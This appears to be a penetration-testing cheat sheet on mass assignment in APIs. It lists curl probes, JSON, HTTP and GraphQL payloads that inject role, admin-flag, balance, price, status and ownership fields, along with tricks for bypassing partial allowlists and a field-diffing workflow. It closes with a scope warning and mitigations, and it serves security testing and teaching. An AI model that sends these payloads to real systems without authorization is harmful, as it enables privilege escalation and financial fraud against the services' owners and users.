# MASS ASSIGNMENT ATTACK PAYLOADS

[OWASP API SECURITY TOP 10 — API3:2023](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/) · [BURP SUITE (PARAM MINER)](https://portswigger.net/bappstore/d152312088594b9bbc55ba2af44604ea)

Baseline Request (legitimate, documented fields only)

    curl -X POST -H 'Content-Type: application/json' -d '{"username":"bob","email":"bob@example.com"}' [URL]/api/users

Mass Assignment Probe (adding undocumented/internal fields)

    curl -X POST -H 'Content-Type: application/json' -d '{"username":"bob","email":"bob@example.com","role":"admin","isVerified":true}' [URL]/api/users

Mass assignment occurs when an API automatically binds client-supplied request fields directly to internal data model properties, without an explicit allowlist of which fields a given request is permitted to set. If a model has sensitive properties (`role`, `isAdmin`, `accountBalance`, `verified`) and the framework's binding is left at defaults, simply adding the field to the request body can set it.

## Structure Reference

| Part | Contains | Relevance |
|---|---|---|
| Request body | Client-supplied JSON/form fields | Fully attacker-controlled — the entire vulnerability class hinges on which of these fields the server actually allows to be written |
| Data model / ORM entity | All persisted properties of the underlying object, including ones never exposed in any documented API field | The attack surface — frameworks that auto-bind request bodies to models (Rails `strong_params` historically, Spring `@ModelAttribute`, many ORMs' `create`/`update` helpers) expose every model property unless explicitly restricted |
| Allowlist/denylist logic | Server-side definition of which fields a given endpoint/role may set | The actual security boundary — every mass assignment attack is an attempt to set a property that exists on the model but was never intended to be client-writable for this endpoint/role |
| Response | Echoes back the created/updated object, or not | If the response reflects the full object, it confirms which injected fields were actually accepted — even without separately re-fetching the object |

## Privilege/Role Field Injection

| Technique | Payload | Purpose |
|---|---|---|
| Direct role escalation | `{"username":"bob","email":"bob@example.com","role":"admin"}` | Tests whether a self-registration or profile-update endpoint blindly binds a `role` field that should only be settable by an existing admin |
| Boolean flag injection | `{"username":"bob","isAdmin":true}`, `{"isVerified":true}`, `{"isPremium":true}` | Boolean privilege/status flags are common mass-assignment targets since they're easy to guess and high-impact to flip |
| Nested object privilege injection | `{"username":"bob","permissions":{"canDeleteUsers":true}}` | Tests whether the binding logic recurses into nested objects/sub-resources without re-applying the same restrictions |
| Array-based role injection | `{"username":"bob","roles":["user","admin"]}` | Tests array-typed privilege fields, which are sometimes overlooked when an allowlist was written only with scalar fields in mind |

## Financial / Business-Logic Field Injection

| Technique | Payload | Purpose |
|---|---|---|
| Balance/credit manipulation | `{"productId":42,"quantity":1,"accountBalance":999999}` | Tests whether a checkout/order endpoint exposes a balance or credit field that should only ever be server-derived |
| Price/discount override | `{"productId":42,"quantity":1,"unitPrice":0.01}` | If price is read from the request rather than re-derived server-side from the product catalog, this directly manipulates transaction value |
| Status/state field injection | `{"orderId":501,"status":"shipped"}` (submitted by a customer, not fulfillment staff) | Tests whether workflow status fields can be set directly by any authenticated user rather than transitioned only through proper server-side logic |
| Ownership/foreign-key reassignment | `{"orderId":501,"userId":2}` (reassigning an object to another account) | Combines with BOLA — tests whether ownership itself is a writable field rather than fixed at creation and immutable thereafter |

## Internal/Hidden Field Discovery

| Technique | Payload (conceptual) | Purpose |
|---|---|---|
| Diffing GET response against POST/PUT body | Compare full fields returned by `GET /api/users/1` against the documented fields accepted by `POST /api/users` | Any field present in the GET response but absent from documented write fields is a mass-assignment candidate worth probing |
| Schema/spec mining (OpenAPI, GraphQL introspection) | Pull the full OpenAPI spec or GraphQL schema and diff every model property against what the front-end form actually submits | Reveals fields the API technically supports but the UI never exposes — these often lack the same scrutiny as UI-driven fields |
| Brute-forcing common internal field names | Iterate `{"createdAt":...}`, `{"updatedAt":...}`, `{"id":...}`, `{"internalNotes":...}`, `{"deletedAt":null}` against a write endpoint | Even without schema access, common ORM/framework conventions make certain field names worth guessing blind |
| JS bundle / mobile app field mining | Search front-end JS bundles or decompiled mobile app code for object/model definitions and form field names | Client code often references the full data model even when the rendered UI only exposes a subset of fields |

## Bypassing Partial Allowlists

| Technique | Payload (conceptual) | Purpose |
|---|---|---|
| Case variation on field names | `{"Role":"admin"}` vs `{"role":"admin"}` | Tests whether an allowlist/denylist check is case-sensitive while the underlying model binding is not |
| Alternate key naming (snake_case/camelCase) | `{"is_admin":true}` vs `{"isAdmin":true}` | If only one naming convention is denylisted but the ORM/serializer accepts both, the other slips through |
| Type juggling on flag fields | `{"isAdmin":"true"}`, `{"isAdmin":1}`, `{"isAdmin":"1"}` | Some loose-typing frameworks coerce non-boolean values to `true`, bypassing a denylist written assuming strict boolean input |
| Wrapping in nested/array structures the allowlist doesn't expect | `{"user":{"role":"admin"}}` submitted to an endpoint expecting a flat body | Tests whether allowlist logic is applied to the parsed object graph as a whole or only to the top-level keys it was written to expect |

## EXAMPLE PAYLOADS

**Registration endpoint privilege escalation:**
```http
POST /api/v1/register HTTP/1.1
Content-Type: application/json

{
  "username": "bob",
  "email": "bob@example.com",
  "password": "hunter2",
  "role": "admin",
  "isVerified": true
}
```

**Profile update with ownership/foreign-key reassignment:**
```http
PUT /api/v1/orders/501 HTTP/1.1
Authorization: Bearer <user_A_token>
Content-Type: application/json

{
  "status": "shipped",
  "userId": 2,
  "total": 0.01
}
```

**GraphQL-flavored mass assignment (cross-reference: see GraphQL cheat sheet):**
```graphql
mutation {
  updateUser(id: "5", role: "admin", accountBalance: 999999) {
    id
    role
    accountBalance
  }
}
```

**Field diffing workflow (conceptual):**
```bash
# 1. Pull the full object as returned by a read endpoint
curl -H 'Authorization: Bearer <token>' [URL]/api/users/1 | jq 'keys'

# 2. Compare against the documented/observed write payload
echo '{"username":"bob","email":"bob@example.com"}' | jq 'keys'

# 3. Probe each field present in (1) but absent from (2) individually
curl -X PUT -H 'Authorization: Bearer <token>' -H 'Content-Type: application/json' \
  -d '{"role":"admin"}' [URL]/api/users/1
```

## Tooling Note

Manual probing builds understanding of the underlying flaw, but dedicated tools automate most of these checks against a live target in one pass: Burp Suite's **Param Miner** for discovering hidden/unlinked parameters, **Arjun** for HTTP parameter discovery against a live endpoint, and manual OpenAPI/GraphQL schema diffing for the most reliable field inventory when a spec is available. Stay within authorized scope — successful role/balance/ownership mass assignment can cause real, persistent privilege escalation or financial impact, not just data exposure.

## Mitigations (for writeups)

- Use an explicit allowlist of bindable fields per endpoint/operation — never bind the full request body directly to a model or ORM entity by default.
- Apply allowlists at the field level per role/context, since the same model may need different writable fields for self-service users vs. admins.
- Treat field naming variations (case, snake_case/camelCase, nesting) as part of the same allowlist — validate the parsed object graph, not just expected top-level key strings.
- Derive sensitive values server-side wherever possible (price from the catalog, status from workflow transitions, ownership from session identity) rather than accepting them as writable request fields at all.
- Use separate, purpose-built DTOs/schemas for input binding distinct from the full internal data model, so internal-only fields are never reachable from client input by construction.
- Re-run the same allowlist/authorization logic on every endpoint that can write to a given model — registration, profile update, and admin endpoints often diverge if maintained separately.

## Quick Notes

- Mass assignment is fundamentally a framework-default problem — many ORMs and serializers bind everything unless explicitly restricted, so the vulnerability is "found" by simply not finding any restriction.
- Always diff a full read of the object against the documented write fields before guessing field names blind; this turns brute-force discovery into a much smaller, targeted list.
- A successful mass assignment finding's severity scales with what the injected field controls — flag privilege (`role`, `isAdmin`) and financial (`balance`, `price`) field findings as critical, well above generic metadata field exposure.
